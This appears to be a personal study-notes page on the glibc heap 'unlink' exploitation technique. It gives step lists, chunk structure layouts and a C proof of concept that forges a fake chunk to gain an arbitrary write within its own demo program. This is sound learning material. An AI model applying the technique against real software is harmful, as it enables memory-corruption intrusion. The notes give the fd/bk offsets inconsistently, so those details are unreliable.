---
layout: default
title: Unlink Attacks
tags:
  - pwn
  - heap
---
# Unlink Exploit

Unlinking for the heap is the processes of removing free chunks from a bin.
write primitive (write-what-where)

## Goal
- Corrupt fd and bk of chunk
	- `fd` : where
	- `bk` : what
### Requirements
- control over `fd` and `bk` pointers in a free bin linked list:
	- corrupt `fd` and `bk` pointers of a free chunk
	- fake chunk in linked list
- Known locations to write to (leak)
- a call to free on the adjacent chunk.

## Steps
1. setup 2 adjacent chunks of smallbins
2. build a fake_chunk at start of chunk1 and it should overflow into chunk2 metadata so can set `prev_size` and `prev_inuse` bit
	- The size of fake chunk should be equal to `prev_size` field of the next chunk. Size must be `chunk2 (from data) - chunk1 `
	- `fd` and `bk` of fake chunk should  be 
		- `fd` :WHERE - 0x18
		- `bk` : WHAT - 0x10
3. trigger unlink


```c
p->bk = addr - 0x18
p->fd = addr - 0x10
```
3. Enter fake chunk in chunk1
4. Trigger the unlink by freeing chunk 2
5. overwrite chunk1 data with target address

```c
struct fake_chunk {
INTERNAL_SIZE_T      mchunk_prev_size; // + 0x00
INTERNAL_SIZE_T      mchunk_size; // + 0x8  
struct malloc_chunk* fd; // + 0x10 |
struct malloc_chunk* bk; // + 0x18	|aw
}
```

## `Unlink` Macro

easier to read code 

```c
#define unlink(Current, Prev, Next) {
	Next = Current->fd;
	Prev = Current->bk;
	Next->bk = Prev;
	Prev->fd = Next;
}
```

`prev -> current -> next`
![pic1](/assets/images/unlink_1.png)

`prev -> current -> next`
![Pic2](/assets/images/unlink_2.png)


Since we control `fd` and `bk` we have arbitrary write

```c
#define unlink(Current, Where, What) {
	Where = Current->fd; // Next | FD
	What = Current->bk; // Prev | BK
	where->bk = what; // next = prev
	what->fd = where; // prev = nextt
}
```


```c
struct malloc_free_chunk {
INTERNAL_SIZE_T      mchunk_prev_size; // + 0x00
INTERNAL_SIZE_T      mchunk_size; // + 0x8  
struct malloc_chunk* fd; // + 0x10
struct malloc_chunk* bk; // + 0x18
}
```

in order to get the correct address for the `fd` and `bk` pointers 
we need to subtract it
```
p->bk = addr - 0x18
p->fd = addr - 0x10
```

---


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct chunk_structure {
    size_t prev_size;
    size_t size;
    struct chunk_structure *fd;
    struct chunk_structure *bk;
    char buf[10];
};

int main () {   

    unsigned long long *chunk1, *chunk2;
    //void *chunk1, *chunk2;
    struct chunk_structure *fake_chunk, *chunk2_hdr;
    char data[20];

    // get to non fastbin chunks
    chunk1 = malloc(0x80);
    chunk2 = malloc(0x80);
    printf("chunk1 ptr : %p\nchunk2 ptr : %p\n", chunk1, chunk2);


    // forge a fake chunk
    fake_chunk = (struct chunk_structure*)chunk1;
    // setup fd and bk pointers to bypass unlink security check
    fake_chunk->fd = (struct chunk_structure*)(&chunk1 - 3); // p->fd->bk == P
    fake_chunk->bk = (struct chunk_structure*)(&chunk1 - 2); // p->bk->fd == p
    printf("Forged fake chunk : %p\nfake_chunk->fd : %p\nfake_chunk->bk : %p\n", &fake_chunk, &fake_chunk->fd, &fake_chunk->bk);

    // modify the header of chunk2 to pass security checks
    chunk2_hdr = (struct chunk_structure*)(chunk2 -2);
    chunk2_hdr->prev_size = 0x80;
    chunk2_hdr->size &= ~1; // uset prev_in_use bit

    printf("Modify chunk2 header : %p\n", &chunk2_hdr);

    
    free(chunk2);
    printf("Now when chunk2 is freed, attacker's fake chunked is unlinked\n");

		 
    chunk1[3] = (unsigned long long)data;
    strcpy(data, "Victim's data");
    printf("Data : %s\n", data);

    chunk1[0] = 0x002164656b636168LL;

    printf("Data : %s\n", data);


    return 0;
}
```

- at least 2 chunks must be allocated
- Make sure that allocated chunks fall in the smallbin range.
- have control of the first chunk and can overflow into second chunk
- A new fake chunk is created in the data part of `chunk1`. The `fd` and `bk` pointers are adjusted to pass the `corrupted double linked list` security check.
- The contents that are overflowed into the second chunk header must set appropriate `prev_size` and `prev_in_use` bit. This ensures that whenever the second chunk is freed, the fake chunk will be detected as 'freed' and will be `unlinked`.  Make sure the `prev_size` is equal to the size of the previous chunk.
- 




```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk, if it is free. */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;                /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```


---

## Resources
- [unlink technique explained](https://www.youtube.com/watch?v=FOdkyVcbCk0)
- [unlink exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)
- [Once upon a free](https://phrack.org/issues/57/9)

---

```c
struct fake_chunk_unlink {
	fd,
	bk
	// data
	// next chunk
	prev_size
	fake_size // unset prev_inuse bit 
}
```

--- 
steps

1. control chunk data and be able to overflow the metadata of adjacent chunk. 
2. fake chunk : forge a fake chunk so it looks like legitimate memory block
3. The fake chunk fd and bk pointers should satisfies the pointer relationship check in unlink opearation. 
4. Modify prev_size of adjacent chunk to pass size check of unlink, and unset its prev_inuse bit
5. Trigger the unlink operation. free adjacent chunk.

--- 
- two chunk with overflow into second chunk
- prev size of corrupted chunk goes must be size from prev_size 